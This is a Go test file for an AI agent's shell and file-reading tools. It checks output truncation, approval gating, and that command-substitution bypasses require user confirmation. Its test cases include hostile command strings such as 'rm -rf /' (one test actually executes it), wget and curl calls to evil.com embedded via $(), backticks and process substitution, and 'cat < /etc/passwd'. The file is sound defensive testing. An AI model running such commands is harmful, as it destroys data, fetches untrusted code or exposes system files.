package tool

import (
	"context"
	"encoding/json"
	"fmt"
	"late/internal/common"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func approvedContext() context.Context {
	return context.WithValue(context.Background(), common.ToolApprovalKey, true)
}

func TestReadFileTool_PartialRead(t *testing.T) {
	// constant setup
	tmpDir := t.TempDir()
	filePath := filepath.Join(tmpDir, "test.txt")
	filePath = filepath.ToSlash(filePath)
	content := "line1\nline2\nline3\nline4\nline5\n"
	err := os.WriteFile(filePath, []byte(content), 0644)
	if err != nil {
		t.Fatal(err)
	}

	tool := NewReadFileTool()

	// Test case: Read lines 2-4
	args := json.RawMessage(`{"path": "` + filePath + `", "start_line": 2, "end_line": 4}`)
	result, err := tool.Execute(context.Background(), args)
	if err != nil {
		t.Fatal(err)
	}

	expected := "2 | line2\n3 | line3\n4 | line4\n"
	if result != expected {
		t.Errorf("Expected:\n%q\nGot:\n%q", expected, result)
	}

	// Test case: Invalid range
	args = json.RawMessage(`{"path": "` + filePath + `", "start_line": 4, "end_line": 2}`)
	result, err = tool.Execute(context.Background(), args)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(result, "Invalid range") {
		t.Errorf("Expected invalid range error, got: %q", result)
	}
}

func TestReadFileTool_NoCaching(t *testing.T) {
	tmpDir := t.TempDir()
	filePath := filepath.Join(tmpDir, "test.txt")
	filePath = filepath.ToSlash(filePath)
	content := "unchanged content"
	os.WriteFile(filePath, []byte(content), 0644)

	tool := NewReadFileTool()
	args := json.RawMessage(`{"path": "` + filePath + `"}`)

	// First read
	res1, err := tool.Execute(context.Background(), args)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(res1, "unchanged content") {
		t.Error("First read failed")
	}

	// Second read (should RETURN CONTENT now, not unchanged message)
	res2, err := tool.Execute(context.Background(), args)
	if err != nil {
		t.Fatal(err)
	}
	// It should contain the content again
	if !strings.Contains(res2, "unchanged content") {
		t.Errorf("Expected content to be returned again, got: %q", res2)
	}
	if strings.Contains(res2, "File has not changed") {
		t.Error("Should not return unchanged message")
	}

	// Modify file
	os.WriteFile(filePath, []byte("new content"), 0644)

	// Third read (should return new content)
	res3, err := tool.Execute(context.Background(), args)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(res3, "new content") {
		t.Errorf("Expected new content, got: %q", res3)
	}
}

func TestReadFileTool_OutputTruncation(t *testing.T) {
	tmpDir := t.TempDir()
	filePath := filepath.Join(tmpDir, "large_test.txt")
	filePath = filepath.ToSlash(filePath)

	// Generate a file that exceeds maxReadFileChars
	var sb strings.Builder
	for i := 0; i < 1000; i++ {
		sb.WriteString(fmt.Sprintf("This is line %d and it contains some text to fill up space.\n", i+1))
	}
	err := os.WriteFile(filePath, []byte(sb.String()), 0644)
	if err != nil {
		t.Fatal(err)
	}

	tool := NewReadFileTool()
	args := json.RawMessage(`{"path": "` + filePath + `"}`)
	result, err := tool.Execute(context.Background(), args)
	if err != nil {
		t.Fatal(err)
	}

	if len(result) > maxReadFileChars+len("... (output truncated)")+100 { // some padding
		t.Errorf("Output length %d exceeds limit %d", len(result), maxReadFileChars)
	}

	if !strings.Contains(result, "... (output truncated)") {
		t.Error("Expected output to contain truncation message")
	}
}

func TestBashTool_Execute(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Unix echo/pwd behavior tests skipped on Windows; see TestPSShellTool_* in implementations_cmd_test.go")
	}
	tests := []struct {
		name    string
		params  json.RawMessage
		wantErr bool
		wantOut string
	}{
		{
			name:    "whitelisted command echo hello",
			params:  json.RawMessage(`{"command": "echo hello"}`),
			wantErr: false,
			wantOut: "hello",
		},
		{
			name:    "non-whitelisted command rm",
			params:  json.RawMessage(`{"command": "rm -rf /"}`),
			wantErr: false,            // Execute itself doesn't check whitelist anymore, RequiresConfirmation does
			wantOut: "Command failed", // it will fail because we are not root or / is protected
		},
		{
			name:    "whitelisted command pwd",
			params:  json.RawMessage(`{"command": "pwd"}`),
			wantErr: false,
			wantOut: "tool", // pwd returns path containing "tool" (the package directory)
		},
		{
			name:    "whitelisted command with multiple args",
			params:  json.RawMessage(`{"command": "echo hello world test"}`),
			wantErr: false,
			wantOut: "hello world test",
		},
		{
			name:    "whitelisted command with quoted args containing spaces",
			params:  json.RawMessage(`{"command": "echo 'hello world' test"}`),
			wantErr: false,
			wantOut: "hello world test",
		},
		{
			name:    "full command string in command field",
			params:  json.RawMessage(`{"command": "echo hello world"}`),
			wantErr: false,
			wantOut: "hello world",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tool := ShellTool{}
			out, err := tool.Execute(approvedContext(), tt.params)
			if (err != nil) != tt.wantErr {
				t.Errorf("Execute() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if tt.wantErr {
				if out != "" {
					t.Errorf("Execute() expected error, got output: %q", out)
				}
			} else {
				if !strings.Contains(out, tt.wantOut) {
					t.Errorf("Execute() output = %q, want to contain %q", out, tt.wantOut)
				}
			}
		})
	}
}

func TestBashTool_CWDParameter(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Unix pwd/path tests skipped on Windows")
	}
	// Create a subdirectory within the current working directory
	// Use a subdirectory of the package directory to ensure it's within allowed paths
	tmpDir := filepath.Join("internal", "tool", "test_cwd")
	err := os.MkdirAll(tmpDir, 0755)
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	tool := ShellTool{}

	// Test with custom cwd
	params := json.RawMessage(fmt.Sprintf(`{"command": "pwd", "cwd": "%s"}`, tmpDir))
	out, err := tool.Execute(approvedContext(), params)
	if err != nil {
		t.Fatalf("Execute() error = %v", err)
	}
	if !strings.Contains(out, tmpDir) {
		t.Errorf("Execute() output = %q, want to contain %q", out, tmpDir)
	}
}

func TestBashTool_MultipleArgs(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Unix echo multi-arg test skipped on Windows; see TestPSShellTool_* in implementations_cmd_test.go")
	}
	tool := ShellTool{}

	// Test with multiple arguments
	params := json.RawMessage(`{"command": "echo arg1 arg2 arg3"}`)
	out, err := tool.Execute(approvedContext(), params)
	if err != nil {
		t.Fatalf("Execute() error = %v", err)
	}

	expected := "arg1 arg2 arg3"
	// Trim trailing newline
	out = strings.TrimSpace(out)
	if out != expected {
		t.Errorf("Execute() output = %q, want %q", out, expected)
	}
}

func TestBashTool_OutputTruncation(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("seq command not available on Windows")
	}
	tool := ShellTool{}

	// Create a command that outputs more than 1024 lines
	// Using seq to generate numbers 1-2000
	params := json.RawMessage(`{"command": "seq 1 2000"}`)
	out, err := tool.Execute(approvedContext(), params)
	if err != nil {
		t.Fatalf("Execute() error = %v", err)
	}

	// Count lines in output
	lines := strings.Split(out, "\n")
	if len(lines) > 1025 { // 1024 lines + truncation message
		t.Errorf("Output has %d lines, expected max 1025", len(lines))
	}

	// Check that truncation message is present
	if !strings.Contains(out, "... (output truncated)") {
		t.Error("Expected output to contain truncation message")
	}
}

func TestBashTool_UnsafeCWD(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Unix /tmp path test skipped on Windows")
	}
	tool := ShellTool{}

	// Try to use an unsafe cwd (outside CWD)
	// This should fail if we're not running from root
	params := json.RawMessage(`{"command": "pwd", "cwd": "/tmp"}`)
	out, err := tool.Execute(approvedContext(), params)

	// The test depends on where we're running from
	// If /tmp is within CWD, this should succeed
	// If /tmp is outside CWD, this should fail
	cwd, _ := os.Getwd()
	absTmp, _ := filepath.Abs("/tmp")

	if !strings.HasPrefix(absTmp, cwd) {
		// /tmp is outside CWD, should return error
		if err == nil {
			t.Errorf("Execute() expected error for unsafe cwd, got output: %q", out)
		}
	} else {
		// /tmp is within CWD, should succeed
		if err != nil {
			t.Errorf("Execute() unexpected error for safe cwd: %v", err)
		}
	}
}

func TestBashTool_DefaultCWD(t *testing.T) {
	tool := ShellTool{}

	// Execute without cwd parameter - should use current directory
	params := json.RawMessage(`{"command": "pwd"}`)
	out, err := tool.Execute(approvedContext(), params)
	if err != nil {
		t.Fatalf("Execute() error = %v", err)
	}

	// Should return the current working directory
	currentDir, err := os.Getwd()
	if err != nil {
		t.Fatalf("Failed to get current directory: %v", err)
	}

	if !strings.Contains(out, currentDir) {
		t.Errorf("Execute() output = %q, want to contain %q", out, currentDir)
	}
}

func TestBashTool_CallString(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Unix CallString prefix tested on Windows via TestPSShellTool_CallString in implementations_cmd_test.go")
	}
	tests := []struct {
		name     string
		params   json.RawMessage
		expected string
	}{
		{
			name:     "simple command",
			params:   json.RawMessage(`{"command": "echo hello"}`),
			expected: "Executing: echo hello",
		},
		{
			name:     "command with cwd",
			params:   json.RawMessage(`{"command": "pwd", "cwd": "/tmp"}`),
			expected: "Executing: pwd in dir: /tmp",
		},
		{
			name:     "command with args and cwd",
			params:   json.RawMessage(`{"command": "echo a b c", "cwd": "/tmp"}`),
			expected: "Executing: echo a b c in dir: /tmp",
		},
		{
			name:     "command only",
			params:   json.RawMessage(`{"command": "pwd"}`),
			expected: "Executing: pwd",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tool := ShellTool{}
			result := tool.CallString(tt.params)
			if result != tt.expected {
				t.Errorf("CallString() = %q, want %q", result, tt.expected)
			}
		})
	}
}

func TestBashTool_MaliciousCatCommands(t *testing.T) {
	tests := []struct {
		name          string
		command       string
		shouldBlock   bool
		expectedError string
	}{
		// Blocked patterns (should return error)
		{
			name:          "blocked: cat > file",
			command:       "cat > test.txt",
			shouldBlock:   true,
			expectedError: "cat cannot be used with output redirection",
		},
		{
			name:          "blocked: cat >> file",
			command:       "cat >> test.txt",
			shouldBlock:   true,
			expectedError: "cat cannot be used with output redirection",
		},
		{
			name:          "blocked: echo | cat > file",
			command:       "echo 'content' | cat > test.txt",
			shouldBlock:   true,
			expectedError: "cat cannot be used with output redirection",
		},
		{
			name:          "blocked: cat 2> file",
			command:       "cat 2> test.txt",
			shouldBlock:   true,
			expectedError: "cat cannot be used with output redirection",
		},
		{
			name:          "blocked: cat 1> file",
			command:       "cat 1> test.txt",
			shouldBlock:   true,
			expectedError: "cat cannot be used with output redirection",
		},
		{
			name:          "blocked: | cat > file",
			command:       "echo test | cat > test.txt",
			shouldBlock:   true,
			expectedError: "cat cannot be used with output redirection",
		},
		{
			name:          "blocked: | cat >> file",
			command:       "echo test | cat >> test.txt",
			shouldBlock:   true,
			expectedError: "cat cannot be used with output redirection",
		},
		// Allowed patterns (should NOT be blocked)
		{
			name:          "allowed: cat file.txt (reading)",
			command:       "cat test.txt",
			shouldBlock:   false,
			expectedError: "",
		},
		{
			name:          "allowed: cat file1 file2 (reading multiple)",
			command:       "cat test1.txt test2.txt",
			shouldBlock:   false,
			expectedError: "",
		},
		// Note: cat < test.txt is NOT blocked by ValidateBashCommand (validation),
		// but it WILL require confirmation due to containsShellMetacharacters.
		// These are separate concerns: ValidateBashCommand blocks dangerous patterns,
		// RequiresConfirmation decides whether to prompt the user.
		{
			name:          "allowed by validation: cat < file (input redirection)",
			command:       "cat < test.txt",
			shouldBlock:   false,
			expectedError: "",
		},
		{
			name:          "allowed: cat file | grep (piping output)",
			command:       "cat test.txt | grep pattern",
			shouldBlock:   false,
			expectedError: "",
		},
		{
			name:          "allowed: cat file1 | grep pattern",
			command:       "cat test1.txt | grep pattern",
			shouldBlock:   false,
			expectedError: "",
		},
		{
			name:          "allowed: cat file1 file2 | grep pattern",
			command:       "cat test1.txt test2.txt | grep pattern",
			shouldBlock:   false,
			expectedError: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tool := ShellTool{}
			err := tool.ValidateBashCommand(tt.command)

			if tt.shouldBlock {
				if err == nil {
					t.Errorf("Expected error for command %q, got nil", tt.command)
				} else if !strings.Contains(err.Error(), tt.expectedError) {
					t.Errorf("Expected error to contain %q, got %q", tt.expectedError, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("Unexpected error for command %q: %v", tt.command, err)
				}
			}
		})
	}
}

func TestBashTool_ValidationMessages(t *testing.T) {
	// Test that error messages are helpful and guide agents
	tool := ShellTool{}

	// Test blocked command
	err := tool.ValidateBashCommand("cat > test.txt")
	if err == nil {
		t.Fatal("Expected error for cat > test.txt, got nil")
	}

	errorMsg := err.Error()

	// Check that error message contains helpful guidance
	if !strings.Contains(errorMsg, "cat cannot be used with output redirection") {
		t.Errorf("Error message should contain 'cat cannot be used with output redirection', got: %q", errorMsg)
	}

	// Test that safe commands don't produce validation errors
	// Note: ValidateBashCommand only checks for blocked patterns (cat redirection, cd).
	// It does NOT check the whitelist or shell metacharacters — that's RequiresConfirmation's job.
	safeCommands := []string{
		"cat test.txt",
		"cat test1.txt test2.txt",
		"cat < test.txt", // validation allows this; RequiresConfirmation will prompt due to '<'
		"cat test.txt | grep pattern",
		"echo hello",
		"grep pattern file.txt",
	}

	for _, cmd := range safeCommands {
		err := tool.ValidateBashCommand(cmd)
		if err != nil {
			t.Errorf("Command %q should not be blocked by validation, got error: %v", cmd, err)
		}
	}
}

func TestBashTool_ExecuteRequiresApproval(t *testing.T) {
	tool := ShellTool{}
	params := json.RawMessage(`{"command": "echo hello"}`)

	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected missing-approval error, got nil")
	}
	if !strings.Contains(err.Error(), "requires explicit approval") {
		t.Fatalf("expected approval error message, got %q", err.Error())
	}

	// Approved execution should proceed.
	out, err := tool.Execute(approvedContext(), params)
	if err != nil {
		t.Fatalf("approved execution failed: %v", err)
	}
	if !strings.Contains(out, "hello") {
		t.Fatalf("expected output to contain hello, got %q", out)
	}
}

func TestBashTool_RequiresConfirmation(t *testing.T) {
	tests := []struct {
		name     string
		params   json.RawMessage
		expected bool
	}{
		// Simple whitelisted commands (no metacharacters)
		{
			name:     "whitelisted command grep",
			params:   json.RawMessage(`{"command": "grep -r pattern ."}`),
			expected: false,
		},
		{
			name:     "whitelisted command ls",
			params:   json.RawMessage(`{"command": "ls"}`),
			expected: false,
		},
		{
			name:     "whitelisted command cat",
			params:   json.RawMessage(`{"command": "cat file.txt"}`),
			expected: false,
		},
		{
			name:     "whitelisted command pwd",
			params:   json.RawMessage(`{"command": "pwd"}`),
			expected: false,
		},
		{
			name:     "whitelisted command head",
			params:   json.RawMessage(`{"command": "head -20 file.go"}`),
			expected: false,
		},
		{
			name:     "whitelisted command wc",
			params:   json.RawMessage(`{"command": "wc -l"}`),
			expected: false,
		},
		// Non-whitelisted commands
		{
			name:     "non-whitelisted command rm",
			params:   json.RawMessage(`{"command": "rm -rf /"}`),
			expected: true,
		},
		{
			name:     "non-whitelisted command curl",
			params:   json.RawMessage(`{"command": "curl"}`),
			expected: true,
		},
		{
			name:     "non-whitelisted command find (removed from whitelist)",
			params:   json.RawMessage(`{"command": "find . -name *.go"}`),
			expected: true,
		},
		{
			name:     "non-whitelisted command echo (removed from whitelist)",
			params:   json.RawMessage(`{"command": "echo hello"}`),
			expected: true,
		},
		{
			name:     "existing mkdir target still prompts",
			params:   json.RawMessage(`{"command": "mkdir ."}`),
			expected: true,
		},
		{
			name:     "existing touch target still prompts",
			params:   json.RawMessage(`{"command": "touch implementations.go"}`),
			expected: true,
		},
		// Invalid input
		{
			name:     "invalid JSON",
			params:   json.RawMessage(`{invalid}`),
			expected: true,
		},
		// Compound commands with non-whitelisted parts
		{
			name:     "semicolon compound with unsafe command",
			params:   json.RawMessage(`{"command": "ls; wget url"}`),
			expected: true,
		},
		{
			name:     "double ampersand compound with unsafe command",
			params:   json.RawMessage(`{"command": "ls && wget url"}`),
			expected: true,
		},
		// Pipe of whitelisted commands (safe)
		{
			name:     "pipe all safe",
			params:   json.RawMessage(`{"command": "cat file.txt | grep pattern"}`),
			expected: false,
		},
		{
			name:     "pipe all safe with wc",
			params:   json.RawMessage(`{"command": "grep -r pattern . | wc -l"}`),
			expected: false,
		},
		// === SHELL METACHARACTER BYPASS PREVENTION ===
		// These are the critical tests. Even if the base command is whitelisted,
		// shell metacharacters that could embed sub-commands MUST trigger confirmation.
		{
			name:     "BYPASS: process substitution >(wget ...)",
			params:   json.RawMessage(`{"command": "cat >(wget https://evil.com/)"}`),
			expected: true,
		},
		{
			name:     "BYPASS: process substitution <(cmd)",
			params:   json.RawMessage(`{"command": "cat <(curl https://evil.com/)"}`),
			expected: true,
		},
		{
			name:     "BYPASS: command substitution $(cmd)",
			params:   json.RawMessage(`{"command": "cat $(wget https://evil.com/)"}`),
			expected: true,
		},
		{
			name:     "BYPASS: backtick command substitution",
			params:   json.RawMessage("{\"command\": \"cat `wget https://evil.com/`\"}"),
			expected: true,
		},
		{
			name:     "BYPASS: variable expansion ${cmd}",
			params:   json.RawMessage(`{"command": "cat ${HOME}"}`),
			expected: true,
		},
		{
			name:     "BYPASS: output redirection",
			params:   json.RawMessage(`{"command": "ls > /tmp/output"}`),
			expected: true,
		},
		{
			name:     "BYPASS: input redirection",
			params:   json.RawMessage(`{"command": "cat < /etc/passwd"}`),
			expected: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tool := ShellTool{}
			result := tool.RequiresConfirmation(tt.params)
			expected := tt.expected
			if runtime.GOOS == "windows" {
				expected = true
			}
			if result != expected {
				t.Errorf("RequiresConfirmation(%s) = %v, want %v", string(tt.params), result, expected)
			}
		})
	}
}

func TestBashTool_RequiresConfirmation_WindowsAlwaysPrompt(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("windows-only safety policy")
	}

	tool := ShellTool{}
	commands := []json.RawMessage{
		json.RawMessage(`{"command": "pwd"}`),
		json.RawMessage(`{"command": "cat file.txt | grep hello"}`),
		json.RawMessage(`{"command": "ls"}`),
	}

	for _, args := range commands {
		if !tool.RequiresConfirmation(args) {
			t.Fatalf("expected RequiresConfirmation=true on Windows for %s", string(args))
		}
	}
}
